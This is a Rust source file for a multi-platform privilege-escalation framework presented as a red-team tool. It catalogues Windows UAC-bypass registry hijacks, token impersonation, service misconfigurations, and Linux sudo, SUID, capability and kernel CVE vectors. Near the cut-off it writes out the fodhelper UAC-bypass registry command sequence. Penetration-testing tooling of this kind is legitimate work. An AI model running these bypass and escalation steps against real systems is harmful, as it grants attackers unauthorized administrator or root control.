//! Privilege Escalation Engine - Multi-Platform PrivEsc Framework
//!
//! Comprehensive privilege escalation framework for authorized penetration testing
//! and red team exercises. Supports Windows, Linux, and macOS.
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
//! All techniques require explicit authorization for deployment.
//!
//! Features:
//! - Auto-enumerate escalation vectors
//! - Check exploitability of each vector
//! - Execute exploits with rollback support
//! - Safe mode demonstrations
//!
//! MITRE ATT&CK Coverage:
//! - T1548.002: Abuse Elevation Control Mechanism: Bypass UAC
//! - T1134.001: Access Token Manipulation: Token Impersonation
//! - T1574.009: Unquoted Service Path
//! - T1574.010: Services File Permissions Weakness
//! - T1548.003: Sudo and Sudo Caching
//! - T1548.001: Setuid and Setgid
//! - T1068: Exploitation for Privilege Escalation
//! - T1548.004: Elevated Execution with Prompt (macOS)

use anyhow::{bail, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::{debug, info, warn};
use uuid::Uuid;

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType, Platform, Session,
};
use crate::modules::evasion::opsec::{OpsecConfig, DefaultTrafficShaper, TrafficShaper};

// ============================================================================
// Core Types
// ============================================================================

/// Severity of a privilege escalation vector
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum Severity {
    Low = 0,
    Medium = 1,
    High = 2,
    Critical = 3,
}

impl Severity {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Low => "Low",
            Self::Medium => "Medium",
            Self::High => "High",
            Self::Critical => "Critical",
        }
    }
}

/// Confidence in exploitability
#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
pub struct Confidence(pub f64);

impl Confidence {
    pub fn high() -> Self {
        Self(0.9)
    }
    pub fn medium() -> Self {
        Self(0.6)
    }
    pub fn low() -> Self {
        Self(0.3)
    }
    pub fn unknown() -> Self {
        Self(0.0)
    }

    pub fn value(&self) -> f64 {
        self.0
    }
}

/// Current privilege level
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PrivilegeLevel {
    /// Unprivileged user
    User,
    /// User with some elevated permissions
    ElevatedUser,
    /// Local administrator
    LocalAdmin,
    /// SYSTEM/root
    System,
}

impl PrivilegeLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::User => "User",
            Self::ElevatedUser => "Elevated User",
            Self::LocalAdmin => "Local Administrator",
            Self::System => "SYSTEM/root",
        }
    }
}

/// Target privilege level to escalate to
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum TargetPrivilege {
    /// Bypass UAC to run as admin
    BypassUAC,
    /// Escalate to elevated user
    ElevatedUser,
    /// Escalate to local administrator
    LocalAdmin,
    /// Escalate to SYSTEM/root
    System,
}

/// Category of privilege escalation technique
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum VectorCategory {
    /// UAC bypass techniques
    UacBypass,
    /// Token manipulation
    TokenManipulation,
    /// Service exploitation
    ServiceExploit,
    /// Configuration weakness
    ConfigWeakness,
    /// Sudo/SUID abuse
    SudoSuid,
    /// Kernel exploit
    KernelExploit,
    /// Capability abuse
    CapabilityAbuse,
    /// Other techniques
    Other,
}

impl VectorCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::UacBypass => "UAC Bypass",
            Self::TokenManipulation => "Token Manipulation",
            Self::ServiceExploit => "Service Exploit",
            Self::ConfigWeakness => "Configuration Weakness",
            Self::SudoSuid => "Sudo/SUID Abuse",
            Self::KernelExploit => "Kernel Exploit",
            Self::CapabilityAbuse => "Capability Abuse",
            Self::Other => "Other",
        }
    }
}

/// A discovered privilege escalation vector
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PrivEscVector {
    pub id: Uuid,
    pub name: String,
    pub description: String,
    pub platform: Platform,
    pub category: VectorCategory,
    pub severity: Severity,
    pub confidence: Confidence,
    pub mitre_id: String,
    pub current_priv: PrivilegeLevel,
    pub target_priv: TargetPrivilege,
    pub requires_interaction: bool,
    pub details: HashMap<String, String>,
}

impl PrivEscVector {
    pub fn new(
        name: &str,
        description: &str,
        platform: Platform,
        category: VectorCategory,
        severity: Severity,
        mitre_id: &str,
        target_priv: TargetPrivilege,
    ) -> Self {
        Self {
            id: Uuid::new_v4(),
            name: name.to_string(),
            description: description.to_string(),
            platform,
            category,
            severity,
            confidence: Confidence::unknown(),
            mitre_id: mitre_id.to_string(),
            current_priv: PrivilegeLevel::User,
            target_priv,
            requires_interaction: false,
            details: HashMap::new(),
        }
    }

    pub fn with_confidence(mut self, confidence: Confidence) -> Self {
        self.confidence = confidence;
        self
    }

    pub fn with_detail(mut self, key: &str, value: &str) -> Self {
        self.details.insert(key.to_string(), value.to_string());
        self
    }

    pub fn with_requires_interaction(mut self, requires: bool) -> Self {
        self.requires_interaction = requires;
        self
    }
}

/// Result of checking exploitability
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitCheckResult {
    pub exploitable: bool,
    pub confidence: Confidence,
    pub details: String,
    pub prerequisites_met: Vec<String>,
    pub prerequisites_missing: Vec<String>,
}

/// Result of executing a privilege escalation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PrivEscResult {
    pub success: bool,
    pub new_privilege_level: Option<PrivilegeLevel>,
    pub message: String,
    pub commands_executed: Vec<String>,
    pub cleanup_required: bool,
    pub cleanup_commands: Vec<String>,
}

// ============================================================================
// Enumerator Trait
// ============================================================================

/// Trait for privilege escalation vector enumeration
#[async_trait]
pub trait PrivEscEnumerator: Send + Sync {
    /// Enumerator name
    fn name(&self) -> &str;

    /// Platform this enumerator targets
    fn platform(&self) -> Platform;

    /// Category of vectors this enumerator finds
    fn category(&self) -> VectorCategory;

    /// Enumerate all potential escalation vectors
    async fn enumerate(&self, session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>>;

    /// Check exploitability of a specific vector
    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult>;

    /// Generate reference documentation for enumeration
    fn generate_reference(&self) -> String;
}

// ============================================================================
// Exploit Trait
// ============================================================================

/// Trait for privilege escalation exploits
#[async_trait]
pub trait PrivEscExploit: Send + Sync {
    /// Exploit name
    fn name(&self) -> &str;

    /// Target vector category
    fn target_category(&self) -> VectorCategory;

    /// Platform this exploit targets
    fn platform(&self) -> Platform;

    /// MITRE ATT&CK ID
    fn mitre_id(&self) -> &str;

    /// Execute the privilege escalation
    async fn run(
        &self,
        vector: &PrivEscVector,
        command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult>;

    /// Generate safe mode demonstration
    fn safe_mode_demo(&self, vector: &PrivEscVector, command: &str) -> String;

    /// Cleanup after exploitation
    async fn cleanup(&self, result: &PrivEscResult, safe_mode: bool) -> Result<()>;
}

// ============================================================================
// Windows Enumerators
// ============================================================================

/// UAC Bypass Enumerator
pub struct UacBypassEnumerator;

#[async_trait]
impl PrivEscEnumerator for UacBypassEnumerator {
    fn name(&self) -> &str {
        "uac_bypass"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::UacBypass
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating UAC bypass vectors");
        }

        // Fodhelper bypass
        let fodhelper = PrivEscVector::new(
            "UAC Bypass - Fodhelper",
            "UAC bypass via fodhelper.exe registry hijacking (ms-settings)",
            Platform::Windows,
            VectorCategory::UacBypass,
            Severity::High,
            "T1548.002",
            TargetPrivilege::BypassUAC,
        )
        .with_confidence(Confidence::high())
        .with_detail("binary", "fodhelper.exe")
        .with_detail("registry_key", r"HKCU\Software\Classes\ms-settings\Shell\Open\command")
        .with_detail("windows_versions", "Windows 10, Windows 11");
        vectors.push(fodhelper);

        // Eventvwr bypass
        let eventvwr = PrivEscVector::new(
            "UAC Bypass - Event Viewer",
            "UAC bypass via eventvwr.exe registry hijacking (mscfile)",
            Platform::Windows,
            VectorCategory::UacBypass,
            Severity::High,
            "T1548.002",
            TargetPrivilege::BypassUAC,
        )
        .with_confidence(Confidence::high())
        .with_detail("binary", "eventvwr.exe")
        .with_detail("registry_key", r"HKCU\Software\Classes\mscfile\Shell\Open\command")
        .with_detail("windows_versions", "Windows 7, Windows 10");
        vectors.push(eventvwr);

        // Computerdefaults bypass
        let computerdefaults = PrivEscVector::new(
            "UAC Bypass - ComputerDefaults",
            "UAC bypass via computerdefaults.exe registry hijacking",
            Platform::Windows,
            VectorCategory::UacBypass,
            Severity::High,
            "T1548.002",
            TargetPrivilege::BypassUAC,
        )
        .with_confidence(Confidence::medium())
        .with_detail("binary", "computerdefaults.exe")
        .with_detail("registry_key", r"HKCU\Software\Classes\ms-settings\Shell\Open\command")
        .with_detail("windows_versions", "Windows 10, Windows 11");
        vectors.push(computerdefaults);

        // SDCLT bypass
        let sdclt = PrivEscVector::new(
            "UAC Bypass - SDCLT",
            "UAC bypass via sdclt.exe isolatedCommand registry hijacking",
            Platform::Windows,
            VectorCategory::UacBypass,
            Severity::High,
            "T1548.002",
            TargetPrivilege::BypassUAC,
        )
        .with_confidence(Confidence::high())
        .with_detail("binary", "sdclt.exe")
        .with_detail("registry_key", r"HKCU\Software\Classes\exefile\shell\runas\command")
        .with_detail("windows_versions", "Windows 10");
        vectors.push(sdclt);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            debug!("[SAFE MODE] Checking exploitability for {}", vector.name);
            return Ok(ExploitCheckResult {
                exploitable: true,
                confidence: Confidence::high(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Registry key writable: Would check HKCU access\n\
                     - Binary exists: Would verify {} exists\n\
                     - UAC settings: Would check ConsentPromptBehavior",
                    vector.name,
                    vector.details.get("binary").unwrap_or(&"binary".to_string())
                ),
                prerequisites_met: vec![
                    "User has HKCU write access".to_string(),
                    "Target binary auto-elevates".to_string(),
                ],
                prerequisites_missing: vec![],
            });
        }

        // In production mode, would actually check registry access, etc.
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== UAC Bypass Enumeration ===

DESCRIPTION:
Enumerates potential UAC bypass vectors by checking for auto-elevating
binaries that can be hijacked via registry modifications.

TECHNIQUES CHECKED:
1. Fodhelper.exe - ms-settings protocol handler
2. Eventvwr.exe - mscfile protocol handler
3. Computerdefaults.exe - ms-settings protocol handler
4. Sdclt.exe - isolatedCommand hijacking

PREREQUISITES:
- User must have write access to HKCU
- Target binary must exist and auto-elevate
- UAC must be enabled but not set to "Always Notify"

DETECTION:
- Registry key creation in HKCU\Software\Classes
- Process creation with integrity level change
- Event ID 4688 with elevated token

MITRE ATT&CK: T1548.002 - Bypass User Account Control
"#
        .to_string()
    }
}

/// Token Impersonation Enumerator
pub struct TokenEnumerator;

#[async_trait]
impl PrivEscEnumerator for TokenEnumerator {
    fn name(&self) -> &str {
        "token_impersonation"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::TokenManipulation
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating token impersonation vectors");
        }

        // Primary token theft
        let primary_token = PrivEscVector::new(
            "Token Impersonation - Primary Token",
            "Steal and impersonate primary tokens from higher-privileged processes",
            Platform::Windows,
            VectorCategory::TokenManipulation,
            Severity::Critical,
            "T1134.001",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("required_privilege", "SeImpersonatePrivilege")
        .with_detail("target_processes", "winlogon.exe, lsass.exe, services.exe");
        vectors.push(primary_token);

        // Service account token
        let service_token = PrivEscVector::new(
            "Token Impersonation - Service Account",
            "Impersonate service account tokens (SeImpersonatePrivilege abuse)",
            Platform::Windows,
            VectorCategory::TokenManipulation,
            Severity::High,
            "T1134.001",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::high())
        .with_detail("required_privilege", "SeImpersonatePrivilege")
        .with_detail("affected_accounts", "IIS APPPOOL, SQL Server, Network Service");
        vectors.push(service_token);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            return Ok(ExploitCheckResult {
                exploitable: true,
                confidence: Confidence::medium(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Check for SeImpersonatePrivilege\n\
                     - Enumerate accessible process tokens\n\
                     - Verify TOKEN_DUPLICATE access",
                    vector.name
                ),
                prerequisites_met: vec!["Would enumerate in production".to_string()],
                prerequisites_missing: vec![],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== Token Impersonation Enumeration ===

DESCRIPTION:
Enumerates potential token impersonation vectors by checking current
privileges and accessible process tokens.

TECHNIQUES CHECKED:
1. Primary token theft from SYSTEM processes
2. Service account token impersonation
3. Named pipe impersonation

PREREQUISITES:
- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- Access to target process tokens

MITRE ATT&CK: T1134.001
"#
        .to_string()
    }
}

/// Service Vulnerability Enumerator
pub struct ServiceVulnEnumerator;

#[async_trait]
impl PrivEscEnumerator for ServiceVulnEnumerator {
    fn name(&self) -> &str {
        "service_vulnerabilities"
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::ServiceExploit
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating service vulnerabilities");
        }

        // Unquoted service path
        let unquoted = PrivEscVector::new(
            "Unquoted Service Path",
            "Service with unquoted path containing spaces - allows DLL hijacking",
            Platform::Windows,
            VectorCategory::ServiceExploit,
            Severity::High,
            "T1574.009",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("example_path", r"C:\Program Files\Vulnerable Service\service.exe")
        .with_detail("exploit_location", r"C:\Program.exe");
        vectors.push(unquoted);

        // Weak service permissions
        let weak_perms = PrivEscVector::new(
            "Weak Service Permissions",
            "Service with modifiable configuration by unprivileged users",
            Platform::Windows,
            VectorCategory::ServiceExploit,
            Severity::Critical,
            "T1574.010",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::high())
        .with_detail("check_command", "sc qc ServiceName & accesschk -uwcqv ServiceName");
        vectors.push(weak_perms);

        // AlwaysInstallElevated
        let always_elevated = PrivEscVector::new(
            "AlwaysInstallElevated",
            "MSI packages install with SYSTEM privileges when both registry keys are set",
            Platform::Windows,
            VectorCategory::ConfigWeakness,
            Severity::Critical,
            "T1574.010",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::high())
        .with_detail("hklm_key", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated")
        .with_detail("hkcu_key", r"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated");
        vectors.push(always_elevated);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            return Ok(ExploitCheckResult {
                exploitable: true,
                confidence: Confidence::medium(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Enumerate services with sc query\n\
                     - Check service ACLs with accesschk\n\
                     - Verify write access to service paths",
                    vector.name
                ),
                prerequisites_met: vec!["Would enumerate in production".to_string()],
                prerequisites_missing: vec![],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== Service Vulnerability Enumeration ===

DESCRIPTION:
Enumerates Windows service misconfigurations that can lead to privilege escalation.

TECHNIQUES CHECKED:
1. Unquoted service paths
2. Weak service permissions (SERVICE_CHANGE_CONFIG, WRITE_DAC)
3. Modifiable service executables
4. AlwaysInstallElevated policy

COMMANDS USED:
- sc qc <service> - Query service configuration
- accesschk -uwcqv <user> <service> - Check service permissions
- reg query HKLM\...\AlwaysInstallElevated - Check MSI elevation

MITRE ATT&CK: T1574.009, T1574.010
"#
        .to_string()
    }
}

// ============================================================================
// Linux Enumerators
// ============================================================================

/// Sudo Abuse Enumerator
pub struct SudoEnumerator;

#[async_trait]
impl PrivEscEnumerator for SudoEnumerator {
    fn name(&self) -> &str {
        "sudo_abuse"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::SudoSuid
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating sudo abuse vectors");
        }

        // Sudo NOPASSWD
        let nopasswd = PrivEscVector::new(
            "Sudo NOPASSWD",
            "Commands executable via sudo without password",
            Platform::Linux,
            VectorCategory::SudoSuid,
            Severity::Critical,
            "T1548.003",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::high())
        .with_detail("check_command", "sudo -l")
        .with_detail("gtfobins_reference", "https://gtfobins.github.io/");
        vectors.push(nopasswd);

        // Sudo version vulnerability
        let sudo_vuln = PrivEscVector::new(
            "Sudo Version Vulnerability",
            "Vulnerable sudo version (CVE-2021-3156 Baron Samedit, etc.)",
            Platform::Linux,
            VectorCategory::SudoSuid,
            Severity::Critical,
            "T1548.003",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("check_command", "sudo --version")
        .with_detail("cve_2021_3156", "sudo < 1.9.5p2");
        vectors.push(sudo_vuln);

        // Sudo env_keep abuse
        let env_keep = PrivEscVector::new(
            "Sudo env_keep Abuse",
            "Abuse sudo env_keep to inject malicious libraries",
            Platform::Linux,
            VectorCategory::SudoSuid,
            Severity::High,
            "T1548.003",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("check_command", "sudo -l | grep env_keep")
        .with_detail("exploitable_vars", "LD_PRELOAD, LD_LIBRARY_PATH, PYTHONPATH");
        vectors.push(env_keep);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            return Ok(ExploitCheckResult {
                exploitable: true,
                confidence: Confidence::medium(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Run 'sudo -l' to list permissions\n\
                     - Check sudo version for known CVEs\n\
                     - Cross-reference with GTFOBins",
                    vector.name
                ),
                prerequisites_met: vec!["Would enumerate in production".to_string()],
                prerequisites_missing: vec![],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== Sudo Abuse Enumeration ===

DESCRIPTION:
Enumerates sudo misconfigurations and vulnerabilities for privilege escalation.

TECHNIQUES CHECKED:
1. NOPASSWD entries in sudoers
2. GTFOBins-compatible binaries
3. Sudo version vulnerabilities (Baron Samedit, etc.)
4. env_keep variable abuse

COMMANDS USED:
- sudo -l - List sudo permissions
- sudo --version - Check sudo version
- grep -r "NOPASSWD" /etc/sudoers* - Find NOPASSWD entries

GTFOBINS INTEGRATION:
Cross-references sudo-allowed binaries with GTFOBins database for
known shell escape techniques.

MITRE ATT&CK: T1548.003
"#
        .to_string()
    }
}

/// SUID Binary Enumerator
pub struct SuidEnumerator;

#[async_trait]
impl PrivEscEnumerator for SuidEnumerator {
    fn name(&self) -> &str {
        "suid_binaries"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::SudoSuid
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating SUID binaries");
        }

        // SUID binaries
        let suid = PrivEscVector::new(
            "SUID Binary Abuse",
            "SUID binaries that can be abused for privilege escalation",
            Platform::Linux,
            VectorCategory::SudoSuid,
            Severity::High,
            "T1548.001",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("find_command", "find / -perm -4000 -type f 2>/dev/null")
        .with_detail("gtfobins_reference", "https://gtfobins.github.io/#+suid");
        vectors.push(suid);

        // SGID binaries
        let sgid = PrivEscVector::new(
            "SGID Binary Abuse",
            "SGID binaries that can be abused for privilege escalation",
            Platform::Linux,
            VectorCategory::SudoSuid,
            Severity::Medium,
            "T1548.001",
            TargetPrivilege::LocalAdmin,
        )
        .with_confidence(Confidence::low())
        .with_detail("find_command", "find / -perm -2000 -type f 2>/dev/null");
        vectors.push(sgid);

        // Custom SUID binaries (non-standard)
        let custom_suid = PrivEscVector::new(
            "Custom SUID Binary",
            "Non-standard SUID binaries potentially vulnerable",
            Platform::Linux,
            VectorCategory::SudoSuid,
            Severity::High,
            "T1548.001",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("check_method", "Compare against known safe SUID list");
        vectors.push(custom_suid);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            return Ok(ExploitCheckResult {
                exploitable: true,
                confidence: Confidence::medium(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Find SUID/SGID binaries with find command\n\
                     - Cross-reference with GTFOBins\n\
                     - Check for custom binaries with vulnerabilities",
                    vector.name
                ),
                prerequisites_met: vec!["Would enumerate in production".to_string()],
                prerequisites_missing: vec![],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== SUID/SGID Binary Enumeration ===

DESCRIPTION:
Enumerates SUID and SGID binaries that may be abused for privilege escalation.

COMMANDS USED:
- find / -perm -4000 -type f 2>/dev/null - Find SUID binaries
- find / -perm -2000 -type f 2>/dev/null - Find SGID binaries

GTFOBINS INTEGRATION:
Cross-references found binaries with GTFOBins database for known
privilege escalation techniques.

COMMON EXPLOITABLE BINARIES:
- vim, vi, nano (editor escape)
- python, perl, ruby (interpreter)
- find, xargs (command execution)
- nmap (interactive mode)

MITRE ATT&CK: T1548.001
"#
        .to_string()
    }
}

/// Kernel Exploit Enumerator
pub struct KernelEnumerator;

#[async_trait]
impl PrivEscEnumerator for KernelEnumerator {
    fn name(&self) -> &str {
        "kernel_exploits"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::KernelExploit
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating kernel exploit vectors");
        }

        // Dirty COW
        let dirty_cow = PrivEscVector::new(
            "Dirty COW (CVE-2016-5195)",
            "Race condition in kernel memory subsystem allowing privilege escalation",
            Platform::Linux,
            VectorCategory::KernelExploit,
            Severity::Critical,
            "T1068",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::low())
        .with_detail("affected_kernels", "Linux < 4.8.3, < 4.7.9, < 4.4.26")
        .with_detail("check_command", "uname -r");
        vectors.push(dirty_cow);

        // Dirty Pipe
        let dirty_pipe = PrivEscVector::new(
            "Dirty Pipe (CVE-2022-0847)",
            "Pipe buffer flag overwrite allowing arbitrary file modification",
            Platform::Linux,
            VectorCategory::KernelExploit,
            Severity::Critical,
            "T1068",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::low())
        .with_detail("affected_kernels", "Linux 5.8 - 5.16.11, 5.15.25, 5.10.102")
        .with_detail("check_command", "uname -r");
        vectors.push(dirty_pipe);

        // PwnKit
        let pwnkit = PrivEscVector::new(
            "PwnKit (CVE-2021-4034)",
            "Polkit pkexec memory corruption vulnerability",
            Platform::Linux,
            VectorCategory::KernelExploit,
            Severity::Critical,
            "T1068",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::medium())
        .with_detail("check_command", "pkexec --version")
        .with_detail("affected_versions", "All pkexec versions before patch");
        vectors.push(pwnkit);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            return Ok(ExploitCheckResult {
                exploitable: false,
                confidence: Confidence::low(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Check kernel version with 'uname -r'\n\
                     - Compare against known vulnerable versions\n\
                     - Verify if patches have been applied",
                    vector.name
                ),
                prerequisites_met: vec![],
                prerequisites_missing: vec!["Kernel version check required".to_string()],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== Kernel Exploit Enumeration ===

DESCRIPTION:
Enumerates potential kernel vulnerabilities based on kernel version and
installed packages.

VULNERABILITIES CHECKED:
1. Dirty COW (CVE-2016-5195) - Linux < 4.8.3
2. Dirty Pipe (CVE-2022-0847) - Linux 5.8-5.16.11
3. PwnKit (CVE-2021-4034) - pkexec

COMMANDS USED:
- uname -r - Get kernel version
- cat /etc/*release - Get distribution info
- pkexec --version - Check polkit version

WARNING:
Kernel exploits can cause system instability. Use with extreme caution
and only in authorized testing environments.

MITRE ATT&CK: T1068
"#
        .to_string()
    }
}

/// Linux Capabilities Enumerator
pub struct CapabilitiesEnumerator;

#[async_trait]
impl PrivEscEnumerator for CapabilitiesEnumerator {
    fn name(&self) -> &str {
        "capabilities"
    }

    fn platform(&self) -> Platform {
        Platform::Linux
    }

    fn category(&self) -> VectorCategory {
        VectorCategory::CapabilityAbuse
    }

    async fn enumerate(&self, _session: &Session, safe_mode: bool) -> Result<Vec<PrivEscVector>> {
        let mut vectors = Vec::new();

        if safe_mode {
            info!("[SAFE MODE] Enumerating Linux capabilities");
        }

        // CAP_SETUID
        let cap_setuid = PrivEscVector::new(
            "CAP_SETUID Capability",
            "Binary with CAP_SETUID can change UID to root",
            Platform::Linux,
            VectorCategory::CapabilityAbuse,
            Severity::Critical,
            "T1548.001",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::high())
        .with_detail("find_command", "getcap -r / 2>/dev/null | grep cap_setuid");
        vectors.push(cap_setuid);

        // CAP_NET_RAW
        let cap_net_raw = PrivEscVector::new(
            "CAP_NET_RAW Capability",
            "Binary with CAP_NET_RAW can perform raw network operations",
            Platform::Linux,
            VectorCategory::CapabilityAbuse,
            Severity::Medium,
            "T1548.001",
            TargetPrivilege::ElevatedUser,
        )
        .with_confidence(Confidence::low())
        .with_detail("find_command", "getcap -r / 2>/dev/null | grep cap_net_raw");
        vectors.push(cap_net_raw);

        // CAP_DAC_OVERRIDE
        let cap_dac = PrivEscVector::new(
            "CAP_DAC_OVERRIDE Capability",
            "Binary can bypass file read/write permission checks",
            Platform::Linux,
            VectorCategory::CapabilityAbuse,
            Severity::High,
            "T1548.001",
            TargetPrivilege::System,
        )
        .with_confidence(Confidence::high())
        .with_detail("find_command", "getcap -r / 2>/dev/null | grep cap_dac");
        vectors.push(cap_dac);

        Ok(vectors)
    }

    async fn check_exploitability(
        &self,
        vector: &PrivEscVector,
        safe_mode: bool,
    ) -> Result<ExploitCheckResult> {
        if safe_mode {
            return Ok(ExploitCheckResult {
                exploitable: true,
                confidence: Confidence::medium(),
                details: format!(
                    "[SAFE MODE] Would check if {} is exploitable:\n\
                     - Run getcap to find binaries with capabilities\n\
                     - Cross-reference with GTFOBins capabilities list\n\
                     - Verify exploitation method for specific binary",
                    vector.name
                ),
                prerequisites_met: vec!["Would enumerate in production".to_string()],
                prerequisites_missing: vec![],
            });
        }
        bail!("Production mode not available in reference implementation");
    }

    fn generate_reference(&self) -> String {
        r#"=== Linux Capabilities Enumeration ===

DESCRIPTION:
Enumerates binaries with dangerous Linux capabilities that can be
abused for privilege escalation.

DANGEROUS CAPABILITIES:
- CAP_SETUID: Change UID to any user (including root)
- CAP_SETGID: Change GID to any group
- CAP_DAC_OVERRIDE: Bypass file permission checks
- CAP_DAC_READ_SEARCH: Bypass file read permission checks
- CAP_SYS_ADMIN: Mount filesystems, load kernel modules
- CAP_NET_RAW: Use raw sockets

COMMANDS USED:
- getcap -r / 2>/dev/null - Find binaries with capabilities
- capsh --print - Show current capabilities

MITRE ATT&CK: T1548.001
"#
        .to_string()
    }
}

// ============================================================================
// Exploits
// ============================================================================

/// UAC Bypass Exploit (Fodhelper)
pub struct FodhelperExploit;

#[async_trait]
impl PrivEscExploit for FodhelperExploit {
    fn name(&self) -> &str {
        "uac_bypass_fodhelper"
    }

    fn target_category(&self) -> VectorCategory {
        VectorCategory::UacBypass
    }

    fn platform(&self) -> Platform {
        Platform::Windows
    }

    fn mitre_id(&self) -> &str {
        "T1548.002"
    }

    async fn run(
        &self,
        vector: &PrivEscVector,
        command: &str,
        safe_mode: bool,
    ) -> Result<PrivEscResult> {
        if safe_mode {
            info!("[SAFE MODE] Would execute UAC bypass via fodhelper");
            return Ok(PrivEscResult {
                success: true,
                new_privilege_level: Some(PrivilegeLevel::LocalAdmin),
                message: self.safe_mode_demo(vector, command),
                commands_executed: vec![
                    format!(r"reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d {} /f", command),
                    r"reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f".to_string(),
                    r"C:\Windows\System32\fodhelper.exe".to_string(),
                ],
